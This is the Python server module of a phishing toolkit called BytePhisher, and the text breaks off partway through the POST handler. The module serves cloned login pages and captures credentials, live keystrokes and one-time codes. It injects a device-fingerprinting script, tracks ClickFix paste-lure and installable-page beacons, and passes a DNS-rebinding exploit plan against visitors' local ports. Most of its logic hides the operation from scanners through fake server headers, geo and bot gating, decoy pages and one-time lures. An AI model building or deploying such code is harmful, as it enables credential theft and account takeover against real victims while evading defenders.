# BytePhisher - pure-Python threaded HTTP server with TLS option,
# full request logging, SQLite-backed capture, and Jinja2 template rendering.
#
# No PHP dependency. Runs on any Python 3.10+.

import contextlib
import http.server
import json
import os
import re
import secrets
import socketserver
import ssl
import time
from urllib.parse import parse_qs, urlparse

from . import asset_path as _asset_path
from . import capture as cap
from . import classify, tls_fp
from . import intel as intel_mod
from . import lures as lures_mod
from . import risk as riskmod
from . import session as session_mod
from . import symbols as _symbols_mod
from . import templates as tpl
from .intel import INTEL_JS_PATH, INTEL_PATH

# 1x1 transparent GIF (43 bytes) served at /px.gif for email open-tracking
GIF_1PX = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!"
           b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
           b"\x00\x02\x02D\x01\x00;")

def _extract_fields(raw: bytes, ct: str) -> dict:
    """Parse a form body into fields.

    Handles application/x-www-form-urlencoded, multipart/form-data (via the
    stdlib email parser - correct for quoted-printable and non-UTF8 charsets)
    and application/json (SPA-style templates post JSON instead of a form).
    """
    ct_l = (ct or "").lower()
    if "multipart/form-data" in ct_l:
        from email.parser import BytesParser
        from email.policy import default as default_policy
        header = f"Content-Type: {ct}\r\nMIME-Version: 1.0\r\n\r\n".encode()
        msg = BytesParser(policy=default_policy).parsebytes(header + raw)
        out = {}
        if msg.is_multipart():
            for part in msg.iter_parts():
                name = part.get_param("name", header="content-disposition")
                if not name or part.get_filename():
                    continue  # skip file uploads
                payload = part.get_payload(decode=True) or b""
                charset = part.get_content_charset() or "utf-8"
                out[name] = payload.decode(charset, "replace")
        return out
    if "application/json" in ct_l:
        try:
            data = json.loads(raw.decode("utf-8", "replace") or "{}")
            if isinstance(data, dict):
                return {k: (v if isinstance(v, str) else json.dumps(v)) for k, v in data.items()}
        except Exception:
            return {}
        return {}
    return {k: v[0] for k, v in parse_qs(raw.decode("utf-8", "replace"), keep_blank_values=True).items()}

def _is_creds(d: dict) -> bool:
    """Credential-pair detection - one implementation for the whole tool.

    The rule lives in core/classify.py so the static server and the reverse
    proxy can never disagree. (The old substring version matched 'pin' inside
    'shipping', turning an address form into a credential pair.)
    """
    return classify.is_credential_pair(d)

def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", otp=False,
                 on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
                 gate=None, decoy_url="", intel=True, intel_perms=False,
                 trust_headers=True, hook_base="/__bh", rebind_host="",
                 exploit_ports=None, exploit_limit=6, server_header="nginx",
                 symbols=None, challenge=None, targets=None, pwa=None):
    # cookie / attribute names for this campaign (fixed by default, randomized with
    # --symbols random): a fixed name is a fingerprint that covers every campaign
    _symbols = symbols or _symbols_mod.Symbols.fixed()
    # the collector's base path (--hook-path): a fixed one is a signature
    def _path_of(default):
        base = (hook_base or "/__bh").rstrip("/")
        return default if base == "/__bh" else default.replace("/__bh", base, 1)

    # A class body cannot see the enclosing function's locals for a name it is
    # itself assigning (`gate = gate` raises NameError), so bind through
    # differently-named locals.
    _gate_obj = gate
    _challenge_obj = challenge
    _targets_obj = targets
    _pwa_cfg = dict(pwa or {})
    _decoy_url = decoy_url
    _intel_on = bool(intel)
    _intel_perms = bool(intel_perms)
    _trust_headers = bool(trust_headers)
    _rotation = list(rotate_dirs or [])
    _notifier = on_capture

    _server_header = (server_header or "").strip()
    class PhishHandler(http.server.BaseHTTPRequestHandler):
        # No Python fingerprint. BaseHTTPRequestHandler advertises
        # "BaseHTTP/0.6 Python/3.x" on every response, which is a one-line rule for
        # any scanner; the header is built here instead so it can be a real web
        # server's (or be omitted entirely).
        server_header = _server_header

        def version_string(self):
            return self.server_header or ""

        def send_response(self, code, message=None):
            self.log_request(code)
            self.send_response_only(code, message)
            if self.server_header:
                self.send_header("Server", self.server_header)
            self.send_header("Date", self.date_time_string())

        # class-level: a handler instance exists per request, so the cache must
        # live on the class (sid -> automation score from the browser dump)
        intel_scores = {}

        # HTTP/1.1 so the victim's browser reuses the connection for the
        # collector waves and assets instead of opening a socket per request.
        # Every response in this handler sends Content-Length (required).
        protocol_version = "HTTP/1.1"
        db = cap.CaptureDB(db_path)
        redirect = redirect_url
        otp_page = otp
        # staticmethod: a plain function stored on the class would bind `self`
        # as its first argument and the callback would receive the handler
        # instead of the capture dict.
        notifier = staticmethod(_notifier) if _notifier else None
        template_name = site_name
        campaign_name = campaign or site_name or ""
        rotation = _rotation                   # A/B: one of these per request
        gate = _gate_obj                       # campaign gating (optional)
        challenge_obj = _challenge_obj         # pre-serve challenge (optional)
        targets_obj = _targets_obj             # target list for prefill (optional)
        pwa = _pwa_cfg                         # installable page (optional)
        decoy = _decoy_url
        intel_on = _intel_on                   # deep device dump on page open
        intel_perms = _intel_perms             # permission-gated probes
        trust_headers = _trust_headers         # honour tunnel/edge IP headers
        geo_cache = {}                         # ip -> (ts, geo), for gating lookups
        geo_cache_ttl = 600

        def log_message(self, fmt, *args):
            pass  # silence default stderr logging; structured logs go to DB

        def _client_ip(self):
            """Real client IP.

            Behind a tunnel the socket address is always the tunnel's local
            connection, so the edge headers must win - that is why they are
            trusted by default. When the server is exposed directly, those
            headers are attacker-controlled and let a client spoof its way past
            the country/datacenter rules and the per-IP hit cap, so
            --no-trust-headers uses the socket address instead.
            """
            if not self.trust_headers:
                return self.client_address[0]
            for h in ("CF-Connecting-IP", "True-Client-IP", "X-Real-IP"):
                v = self.headers.get(h)
                if v:
                    return v.strip()
            xff = self.headers.get("X-Forwarded-For")
            if xff:
                return xff.split(",")[0].strip()
            return self.client_address[0]

        GEO_URLS = {
            # free, no-key endpoints; correct paths matter (a bare host 404s)
            "ipapi":  "https://ipapi.co/{ip}/json/",
            "ipinfo": "https://ipinfo.io/{ip}/json",
        }

        def _json(self, obj, status=200):
            body = json.dumps(obj, default=str).encode()
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _store_intel(self, payload):
            """Merge one device-dump wave into the session's intel record."""
            sid = str(payload.get("sid") or "").strip() or self._intel_sid()
            ip = self._client_ip()
            try:
                merged = intel_mod.merge_waves(self.db.intel_for_session(sid), payload)
            except Exception:
                merged = intel_mod.merge_waves({}, payload)
            geo = self._geo_cached(ip) if self.gate and self.gate.needs_geo else self._geo(ip)
            summary = intel_mod.summarize(merged, ua=payload.get("ua")
                                          or self.headers.get("User-Agent", ""),
                                          server_ip=ip,
                                          geo_country=(geo or {}).get("country", ""))
            summary["sid"] = sid
            with contextlib.suppress(Exception):
                self.intel_scores[sid] = int((summary.get("automation") or {})
                                             .get("headless_score") or 0)
            risk = intel_mod.risk_from_intel(summary)
            raw = {"mods": merged, "last": payload}
            try:
                if self.db.intel_for_session(sid):
                    self.db.intel_update(sid, summary, raw, risk=risk)
                else:
                    self.db.log_intel(sid, ip, (geo or {}).get("city", ""),
                                      (geo or {}).get("country", ""), (geo or {}).get("isp", ""),
                                      summary.get("user_agent")
                                      or payload.get("ua")
                                      or self.headers.get("User-Agent", ""),
                                      summary, raw, risk=risk)
            except Exception as e:
                return {"ok": False, "error": f"store failed: {e}"}
            if self.notifier and payload.get("wave") in ("open", "gesture", "final"):
                with contextlib.suppress(Exception):
                    self.notifier({"type": "intel", "sid": sid, "ip": ip,
                                   "browser": summary.get("browser"), "os": summary.get("os"),
                                   "device_class": summary.get("device_class"),
                                   "device_token": (summary.get("fingerprint") or {}).get("device_token"),
                                   "headless": (summary.get("automation") or {}).get("headless_score"),
                                   "vpn": (summary.get("network_risk") or {}).get("vpn_suspected_score"),
                                   "wave": payload.get("wave")})
            return {"ok": True, "sid": sid, "wave": payload.get("wave"),
                    "modules": len(summary.get("modules_collected") or []),
                    "headless": (summary.get("automation") or {}).get("headless_score"),
                    "device_token": (summary.get("fingerprint") or {}).get("device_token")}

        def _geo_cached(self, ip):
            """Geo with a per-process TTL cache - gating must not call the geo
            API on every single request."""
            now = time.time()
            hit = self.geo_cache.get(ip)
            if hit and now - hit[0] < self.geo_cache_ttl:
                return hit[1]
            geo = self._geo(ip)
            self.geo_cache[ip] = (now, geo)
            return geo

        def _serve_decoy(self):
            """One decoy path for every refusal (gate, bot gate, burned lure).

            Default is an inert 503 that looks like a dead link rather than a
            phishing framework; with --decoy set the visitor is redirected
            instead, which is what a real campaign uses to look legitimate.
            """
            if self.decoy:
                self.send_response(302)
                self.send_header("Location", self.decoy)
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            body = (b"<!doctype html><html><head><title>503</title></head>"
                    b"<body><h1>Service unavailable</h1>"
                    b"<p>This link is no longer active.</p></body></html>")
            self.send_response(503)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _gated_out(self, ip, geo=None):
            """True when the campaign gate refuses this visitor.
            The refusal is logged (with reason) and the visitor gets the decoy."""
            if not (self.gate and self.gate.enabled):
                return False
            geo = geo or (self._geo_cached(ip) if self.gate.needs_geo
                          else {"country": "", "isp": ""})
            allowed, reason = self.gate.check(
                ip=ip, country=geo.get("country"), country_code=geo.get("country_code", ""),
                isp=geo.get("isp"),
                ua=self.headers.get("User-Agent", ""),
                org=geo.get("org", "") or geo.get("isp", ""), asn=geo.get("asn", ""))
            if allowed and self.gate.max_hits_per_device:
                # the device token arrives with the collector's beacon, so the cap is
                # checked against the session record that carries it
                rec = None
                with contextlib.suppress(Exception):
                    rec = self._vault()
                token = (rec or {}).get("device_token") or ""
                if token:
                    over, count = self.gate.device_capped(
                        token, extra=self.db.device_hit_count(token))
                    if over:
                        allowed, reason = False, f"device cap reached ({count})"
                    else:
                        self.gate.note_device_hit(token)
            if allowed:
                return False
            with contextlib.suppress(Exception):
                self.db.log_blocked(ip, geo.get("country", ""), reason)
            self._serve_decoy()
            return True

        def _geo(self, ip):
            if geo_provider == "off" or not ip:
                return {"ip": ip, "city": "", "country": "", "isp": ""}
            tmpl = self.GEO_URLS.get(geo_provider)
            if not tmpl:
                return {"ip": ip, "city": "", "country": "", "isp": ""}
            try:
                from . import net
                g = net.fetch_json(tmpl.format(ip=ip), timeout=5)
                _name = g.get("country_name") or g.get("country") or ""
                _code = g.get("country_code") or ""
                if not _code and len(str(g.get("country") or "")) == 2:
                    _code = str(g["country"])       # ipinfo returns the ISO code here
                return {
                    "ip": ip,
                    "city": g.get("city") or "",
                    "country": _name,
                    "country_code": str(_code).upper(),
                    "isp": (g.get("org") or g.get("asn") or g.get("isp") or ""),
                }
            except Exception:
                return {"ip": ip, "city": "", "country": "", "isp": ""}

        def _device(self, ua: str):
            # one implementation, shared with the proxy (core/classify.py)
            return classify.classify_device(ua)

        def _ja4h(self):
            """JA4H for this request (header names + cookies, as the client sent them)."""
            from core import tls_fp as _fp
            with contextlib.suppress(Exception):
                return _fp.ja4h(self.command, self.request_version,
                                list(self.headers.items()))
            return ""

        def _client_fp(self):
            """JA3/JA3S of this connection (empty when TLS terminates elsewhere)."""
            return getattr(self.connection, "_bh_tls_fp", {}) or {}

        def _vault(self, sid=None):
            """Get-or-create the session vault record for this visitor."""
            sid = sid or self._intel_sid()
            rec = None
            try:
                rec = self.db.session_get(sid)
            except Exception:
                rec = None
            if rec:
                return rec
            rec = session_mod.new_record(
                sid, phishlet="static", campaign=self.campaign_name,
                ip=self._client_ip(), ua=self.headers.get("User-Agent", ""),
                ja3=self._client_fp(),
                geo=self._geo_cached(self._client_ip())
                if self.gate and self.gate.needs_geo else self._geo(self._client_ip()))
            return rec

        def _resolve_lure(self, rec):
            """Attach /l/<token> or ?l=<token> to the session (one-time burns)."""
            parsed = urlparse(self.path)
            token = lures_mod.extract_token(parsed.path, parsed.query)
            if not token or not rec:
                return None
            if rec.get("lure"):
                return None
            lure = self.db.lure_get(token)
            if not lure:
                return None
            if not self.db.lure_use(lure, self._client_ip()):
                rec["lure"] = f"burned:{token}"
                return None
            rec["lure"] = lure.token
            session_mod.touch(rec, "lure", f"{lure.kind}:{lure.token}")
            return lure

        def _intel_sid(self):
            """Session id for the device dump: reuse the cookie only if it is OURS.

            any 8-64 hex value in the intel cookie was adopted verbatim, so a
            client could key its own vault/intel record and pre-seed ids (session
            fixation). An unknown id is replaced by a server-minted one.
            """
            cached = getattr(self, "_sid_cache", None)
            if cached:
                return cached
            m = re.search(rf"{re.escape(_symbols.intel)}=([0-9a-f]{{8,64}})",
                          self.headers.get("Cookie") or "")
            if m:
                cand = m.group(1)
                try:
                    if self.db.session_get(cand) or self.db.intel_for_session(cand):
                        self._sid_cache = cand
                        return cand
                except Exception:
                    pass
            sid = secrets.token_hex(16)
            # resolve ONCE per request: minting twice made the Set-Cookie carry one id and
            # the session record another, so a challenge token bound to the record never
            # matched the cookie the browser sent back
            self._sid_cache = sid
            return sid


        def handle_one_request(self):
            """Run one request; a client that leaves mid-response is not an error.

            BrokenPipeError / ConnectionResetError happen constantly on a public
            listener (a tunnel closing a socket, a browser cancelling a navigation)
            and must not print a traceback over the operator's capture feed.
            """
            try:
                super().handle_one_request()
            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
                self.close_connection = True

        @staticmethod
        def _challenge_verify_path():
            from core.challenge import VERIFY_PATH
            return VERIFY_PATH

        def _challenge_cookie_name(self):
            return _symbols.session + "v"

        def _challenged_through(self):
            """Has this browser already passed the pre-serve challenge?"""
            if self.challenge_obj is None:
                return True
            name = self._challenge_cookie_name()
            m = re.search(rf"{re.escape(name)}=([A-Za-z0-9_\-=]+)",
                          self.headers.get("Cookie") or "")
            if not m:
                return False
            sid = self._intel_sid()
            return bool(self.challenge_obj.verify(m.group(1), sid))

        def _challenge_applies(self, path):
            """Only a page navigation is challenged; assets and our own routes are not."""
            if self.challenge_obj is None:
                return False
            if self.command not in ("GET", "HEAD", "POST"):
                return False
            if classify.has_asset_extension(path):
                return False
            if not classify.accept_is_a_navigation(self.headers.get("Accept")):
                return False
            for p in (_path_of(intel_mod.INTEL_PATH), _path_of(intel_mod.LIVE_PATH),
                      _path_of(intel_mod.INTEL_JS_PATH), _path_of(intel_mod.SW_PATH),
                      _path_of(self._challenge_verify_path()), _path_of("/__bh/beacon"),
                      "/health", "/px.gif"):
                if path == p or path.startswith(p + "?"):
                    return False
            return True

        def _serve_challenge(self, next_url="/"):
            """The interstitial: no template, no hook tag, no collector - nothing to scan."""
            ch = self.challenge_obj
            body = ch.page(next_url, verify_url=_path_of(self._challenge_verify_path()),
                           brand=ch.brand).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.send_header("Referrer-Policy", "no-referrer")
            # the session cookie must be set here: without it the visitor has no id, the
            # verify route mints a different one, and the token it issues can never match
            # the cookie the browser sends back on the next hit
            self.send_header("Set-Cookie",
                             f"{_symbols.intel}={self._intel_sid()}; Path=/; "
                             "SameSite=Lax; HttpOnly")
            self.send_header("Set-Cookie",
                             f"{self._challenge_cookie_name()}=; Path=/; "
                             "SameSite=Lax; HttpOnly; Max-Age=0")
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(body)
            with contextlib.suppress(Exception):
                self.db.session_save(self._vault())

        def _verify_route(self):
            """Score one challenge report; issue the token only for a pass."""
            n = self._body_len()
            if n is None:
                return
            raw = self.rfile.read(n) if n else b""
            try:
                signals = json.loads(raw.decode("utf-8", "replace") or "{}")
                if not isinstance(signals, dict):
                    raise ValueError("payload must be an object")
            except Exception:
                self._json({"ok": False, "error": "malformed json"}, status=400)
                return
            ch = self.challenge_obj
            if ch is None:
                self._json({"ok": True})
                return
            ok, score, reasons = ch.judge(signals)
            sid = self._intel_sid()
            if ok:
                token = ch.issue(sid)
                cookie = (f"{self._challenge_cookie_name()}={token}; Path=/; "
                          f"SameSite=Lax; HttpOnly")
                if self._over_tls():
                    cookie += "; Secure"
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Cache-Control", "no-store")
                self.send_header("Set-Cookie", cookie)
                body = json.dumps({"ok": True, "score": score}).encode()
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                rec = self._vault()
                session_mod.touch(rec, "challenge", f"passed score={score}")
                with contextlib.suppress(Exception):
                    self.db.session_save(rec)
                return
            rec = self._vault()
            rec.setdefault("meta", {})["challenge"] = {"score": score, "reasons": reasons}
            session_mod.touch(rec, "challenge", f"refused score={score}")
            with contextlib.suppress(Exception):
                self.db.session_save(rec)
            self._json({"ok": False, "score": score, "reasons": reasons})

        def _over_tls(self):
            if getattr(self.connection, "cipher", None):
                return True
            if not getattr(self, "trust_headers", False):
                return False
            proto = (self.headers.get("X-Forwarded-Proto") or "").split(",")[0].strip()
            return proto.lower() == "https"

        def _framing_ok(self):
            """Reject a request that frames itself two ways, or twice.

            `Content-Length` with `Transfer-Encoding`, and a duplicated Content-Length (read as
            the first value), frame one request two ways and let a client smuggle a
            second request inside the first body's bytes.

            Every refusal here leaves a body unread on a keep-alive connection, so the
            connection is closed: the leftover bytes were otherwise parsed as the next
            request line (measured: the form body read back as a method name).
            """
            te = self.headers.get("Transfer-Encoding")
            cls = self.headers.get_all("Content-Length") or []
            if te and cls:
                self.close_connection = True
                self._json({"ok": False, "error": "ambiguous framing"}, status=400)
                return False
            if len(cls) > 1:
                self.close_connection = True
                self._json({"ok": False, "error": "duplicate content-length"}, status=400)
                return False
            if te:
                # DEFECT: this server never reads a chunked body (there is no de-chunker
                # here), so a `Transfer-Encoding: chunked` login POST was read as empty and
                # the chunks left in the stream were parsed as a new request. RFC 9112 7.1:
                # respond 501 to a transfer coding that cannot be handled.
                self.close_connection = True
                self._json({"ok": False, "error": "unsupported transfer-encoding"}, status=501)
                return False
            return True

        def _body_len(self, max_body=None):
            """A safe Content-Length, or None when the request has been answered.

            `int(headers.get("Content-Length", 0))` raises ValueError on a non-numeric header
            (dropped connection, traceback in the operator's log), and a negative value
            reaches `rfile.read(-1)`, which reads to EOF and holds the worker thread
            until the client closes.
            """
            raw = self.headers.get("Content-Length")
            if raw is None or raw == "":
                return 0
            try:
                n = int(raw)
            except (TypeError, ValueError):
                self.close_connection = True
                self._json({"ok": False, "error": "bad content-length"}, status=400)
                return None
            if n < 0:
                # DEFECT: a negative length was read as "no body", so the bytes the client
                # sent stayed in the stream and were parsed as the next request while the
                # submission was dropped. Invalid framing -> reject and close.
                self.close_connection = True
                self._json({"ok": False, "error": "bad content-length"}, status=400)
                return None
            cap = max_body or (2 * 1024 * 1024)
            if n > cap:
                # the declared body is unread: close so it is never parsed as a request
                self.close_connection = True
                self._json({"ok": False, "error": "payload too large"}, status=413)
                return None
            return n

        def do_GET(self):
            if not self._framing_ok():
                return
            if self.pwa and self.path.split("?")[0] == self.pwa.get("manifest_path"):
                from core import pwa as _pwa
                man = _pwa.manifest(name=self.pwa.get("name") or "Portal",
                                    short_name=self.pwa.get("short_name") or "",
                                    start_url=self.pwa.get("start_url") or "/")
                blob = json.dumps(man).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/manifest+json")
                self.send_header("Cache-Control", "no-store")
                self.send_header("Content-Length", str(len(blob)))
                self.end_headers()
                self.wfile.write(blob)
                return
            if self.path.split("?")[0] == _path_of(intel_mod.SW_PATH):
                # the assets ship inside the package (core/assets) so a wheel carries them
                sw_path = _asset_path("sw.js")
                sid = self._intel_sid()
                try:
                    sw = intel_mod.render_sw(sw_path, sid,
                                             endpoint=_path_of(intel_mod.INTEL_PATH),
                                             live_path=_path_of(intel_mod.LIVE_PATH)).encode()
                except Exception as e:
                    sw = (f"/* service worker unavailable: {e} */").encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Cache-Control", "no-store")
                self.send_header("Service-Worker-Allowed", "/")
                self.send_header("Content-Length", str(len(sw)))
                self.end_headers()
                self.wfile.write(sw)
                return
            if self.path.split("?")[0] == _path_of("/__bh/beacon"):
                # the paste layer (ClickFix) and the installable page report here: both
                # outlive the tab, so both are worth a row of their own
                q = parse_qs(urlparse(self.path).query)
                kind = (q.get("k", [""])[0] or "").strip().lower()
                sid = (q.get("s", [self._intel_sid()])[0] or "")
                if kind:
                    rec = self.db.session_get(sid)
                    if rec:
                        if kind.startswith("pwa"):
                            rec.setdefault("pwa", {})[kind] = time.time()
                            session_mod.touch(rec, "pwa", kind)
                        else:
                            rec.setdefault("clickfix", []).append(
                                {"kind": kind, "ts": time.time()})
                            session_mod.touch(rec, "clickfix", kind)
                        with contextlib.suppress(Exception):
                            self.db.session_save(rec)
                        if self.on_capture:
                            with contextlib.suppress(Exception):
                                self.on_capture({
                                    "type": "clickfix" if not kind.startswith("pwa") else "pwa",
                                    "sid": sid, "ip": self.client_address[0],
                                    "campaign": rec.get("campaign", ""),
                                    "phishlet": rec.get("phishlet", ""),
                                    "detail": kind,
                                    "state": rec.get("state"),
                                })
                gif = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!"
                       b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
                       b"\x00\x02\x02D\x01\x00;")
                self.send_response(200)
                self.send_header("Content-Type", "image/gif")
                self.send_header("Cache-Control", "no-store")
                self.send_header("Content-Length", str(len(gif)))
                self.end_headers()
                self.wfile.write(gif)
                return
            if self.path.split("?")[0] in (_path_of(INTEL_JS_PATH), "/intel.js"):
                q = parse_qs(urlparse(self.path).query)
                sid = (q.get("s", [self._intel_sid()])[0] or self._intel_sid())
                perms = q.get("p", ["1" if self.intel_perms else "0"])[0] in ("1", "true")
                js_path = _asset_path("intel.js")
                try:
                    js = intel_mod.render_js(js_path, intel_mod.safe_sid(sid),
                                             endpoint=_path_of(intel_mod.INTEL_PATH),
                                             live_path=_path_of(intel_mod.LIVE_PATH),
                                             sw_path=_path_of(intel_mod.SW_PATH),
                                             rebind_host=rebind_host,
                                             kill_plan=intel_mod.exploit_plan(
                                                 rebind_host, ports=exploit_ports,
                                                 limit=exploit_limit),
                                            perms=perms).encode()
                except Exception as e:
                    js = (f"/* intel collector unavailable: {e} */").encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/javascript")
                self.send_header("Cache-Control", "no-store")
                self.send_header("Content-Length", str(len(js)))
                self.send_header("Set-Cookie",
                                 f"{_symbols.intel}={sid}; Path=/; SameSite=Lax; HttpOnly")
                self.end_headers()
                self.wfile.write(js)
                return
            if self.path == "/health":
                body = b"ok"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return
            # 1x1 email open-tracking pixel: returns a real GIF and counts a visit
            if self.path.startswith("/px.gif"):
                with contextlib.suppress(Exception):
                    self.db.log_visit(self._client_ip(), self.headers.get("User-Agent", ""))
                self.send_response(200)
                self.send_header("Content-Type", "image/gif")
                self.send_header("Content-Length", str(len(GIF_1PX)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(GIF_1PX)
                return
            # page view -> visitor counter (creds come in via POST).
            # The campaign gate runs first: a refused visitor is logged as
            # blocked and never counted as a served visitor.
            ip = self._client_ip()
            rec = self._vault()
            self._resolve_lure(rec)
            if str(rec.get("lure", "")).startswith("burned:"):
                # one-time lure already used: this visitor gets the decoy
                self.db.session_save(rec)
                self._serve_decoy()
                return
            try:
                # JA4H is the REQUEST fingerprint (header names + cookies) and belongs on
                # the record, never inside the `ja3` dict: a dict holding only ja4h looks
                # like a minimal scripted TLS client to the bot gate
                if not rec.get("ja4h"):
                    rec["ja4h"] = self._ja4h()
                session_mod.touch(rec, "opened", ip)
                self.db.session_save(rec)
            except Exception:
                pass
            # bot gate: score the visit from TLS + UA; a scanner gets the decoy
            if self.gate is not None and getattr(self.gate, "bot_gate", False):
                action, score, reasons = self.gate.bot_check(
                    ja3=rec.get("ja3") or self._client_fp(),
                    ua=self.headers.get("User-Agent", ""),
                    intel={"headless_score": self.intel_scores.get(rec.get("sid"), 0)})
                if action == "decoy":
                    session_mod.touch(rec, "scanner", f"score={score}")
                    try:
                        self.db.record_scanner(ip, self.headers.get("User-Agent", ""),
                                               reasons, score, path=self.path)
                        self.db.session_save(rec)
                    except Exception:
                        pass
                    self._serve_decoy()
                    return
            if self._gated_out(ip):
                return
            if self._challenge_applies(self.path.split("?")[0]) and not self._challenged_through():
                self._serve_challenge(self.path)
                return
            with contextlib.suppress(Exception):
                self.db.log_visit(ip, self.headers.get("User-Agent", ""))
            if self.gate and self.gate.enabled:
                self.gate.note_hit(ip)
            # render template - OTP page only when explicitly requested (/otp),
            # otherwise the victim always sees the login page first.
            # With --rotate, one of the rotation templates is chosen per request.
            import random
            site = (random.choice(self.rotation) if self.rotation
                    else self.server.current_site)
            self.served_site = site
            if site and os.path.isdir(site):
                want_otp = self.otp_page and "otp" in self.path.lower()
                html = tpl.render_site(site, self.path, want_otp)
                if self.targets_obj is not None:
                    # the visitor's own address already in the form is what separates a
                    # targeted page from a mass one
                    from core import targets as _targets
                    hit = self.targets_obj.for_request(self.path, self.path)
                    if hit is not None:
                        html = _targets.prefill_html(html, hit)
                        with contextlib.suppress(Exception):
                            rec = self._vault()
                            rec.setdefault("meta", {})["target"] = hit.to_dict()
                            self.db.session_save(rec)
                if self.intel_on:
                    sid = self._intel_sid()    # kept for the cookie, not for the HTML
                    tag = (f'<script src="{_path_of(INTEL_JS_PATH)}?p='
                           f'{1 if self.intel_perms else 0}" '
                           f'{_symbols.intel_attr}="{_path_of(INTEL_PATH)}" '
                           f'defer></script>')
                    if "</head>" in html.lower():
                        html = re.sub(r"</head>", tag + "</head>", html, count=1, flags=re.I)
                    else:
                        html = tag + html
                    self._intel_cookie = sid
                if self.pwa:
                    # an installable page survives the tab closing: the icon reopens the
                    # lure with no new message and no new link
                    from core import pwa as _pwa
                    html = _pwa.inject(html,
                                       manifest_path=self.pwa.get("manifest_path", ""),
                                       sw_path=self.pwa.get("sw_path", ""),
                                       prompt=bool(self.pwa.get("prompt", True)))
                self.send_response(200)
                body = html.encode("utf-8")
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                if getattr(self, "_intel_cookie", None):
                    self.send_header("Set-Cookie",
                                     f"{_symbols.intel}={self._intel_cookie}; "
                                     f"Path=/; SameSite=Lax; HttpOnly")
                self.end_headers()
                self.wfile.write(body)
            else:
                self.send_error(404)

        def do_POST(self):
            if not self._framing_ok():
                return
            if self.path.split("?")[0] == _path_of(self._challenge_verify_path()):
                self._verify_route()
                return
            if self._challenge_applies(self.path.split("?")[0]) and not self._challenged_through():
                # a credential POST from a client that never met the challenge is not a
                # victim: store nothing and show the interstitial
                self._serve_challenge(self.path)
                return
            if self.path.split("?")[0] == _path_of(intel_mod.LIVE_PATH):
                n = self._body_len()
                if n is None:
                    return
                raw = self.rfile.read(n) if n else b""
                try:
                    payload = json.loads(raw.decode("utf-8", "replace") or "{}")
                    if not isinstance(payload, dict):
                        raise ValueError("not an object")
                except Exception:
                    self._json({"ok": False, "error": "malformed json"}, status=400)
                    return
                events, kind = intel_mod.normalise_live(payload)
                if not events:
                    self._json({"ok": True, "stored": 0})
                    return
                sid = str(payload.get("sid") or "").strip() or self._intel_sid()
                with contextlib.suppress(Exception):
                    self.db.live_add(sid, kind, events, ts=payload.get("ts"))
                otps = [e for e in events if e.get("k") == "input"
                        and intel_mod.looks_like_otp(e.get("n"), e.get("v"))]
                if self.notifier:
                    with contextlib.suppress(Exception):
                        self.notifier({"type": "otp" if otps else "live", "sid": sid,
                                       "ip": self._client_ip(), "campaign": self.campaign_name,
                                       "kind": kind, "events": events[-12:],
                                       "otp": [{"field": e.get("n"), "value": e.get("v")} for e in otps]})
                self._json({"ok": True, "stored": len(events), "otp": bool(otps)})
                return

            # `_path_of(...)`, not the fixed constant: with --hook-path the injected tag
            # advertised the relocated route while this check still looked for the
            # default one, so the 48-module device dump fell through to the credential
            # branch and was stored as a junk capture (silent data loss)
            if self.path.split("?")[0] in (_path_of(intel_mod.INTEL_PATH), "/intel"):
                n = self._body_len()
                if n is None:
                    return
                raw = self.rfile.read(n) if n else b""
                try:
                    payload = json.loads(raw.decode("utf-8", "replace") or "{}")
                    if not isinstance(payload, dict):
                        raise ValueError("not an object")
                except Exception:
                    self._json({"ok": False, "error": "malformed json"}, status=400)
                    return
                if not payload.get("mods") and not payload.get("errors"):
                    self._json({"ok": False, "error": "empty payload"}, status=400)
                    return
                self._json(self._store_intel(payload))
                return
            length = self._body_len()
            if length is None:
                return
            # POST counts against the hit cap as well: a POST-only client used to
            # bypass --max-hits entirely (only GET called note_hit)
            _ip = self._client_ip()
            if self.gate and self.gate.enabled:
                self.gate.note_hit(_ip)
            raw = self.rfile.read(length)
            ct = (self.headers.get("Content-Type") or "").lower()
            fields = _extract_fields(raw, ct)
            ip = self._client_ip()
            rec = self._vault()
            self._resolve_lure(rec)
            if str(rec.get("lure", "")).startswith("burned:"):
                # one-time lure already used: this visitor gets the decoy
                self.db.session_save(rec)
                if self.decoy:
                    self.send_response(302)
                    self.send_header("Location", self.decoy)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                else:
                    body = (b"<!doctype html><html><head><title>503</title></head>"
                            b"<body><h1>Service unavailable</h1></body></html>")
                    self.send_response(503)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    self.wfile.write(body)
                return
            try:
                session_mod.touch(rec, "opened", ip)
                self.db.session_save(rec)
            except Exception:
                pass
            if self._gated_out(ip):
                return
            geo = self._geo(ip)
            ua = self.headers.get("User-Agent", "")
            dev = self._device(ua)
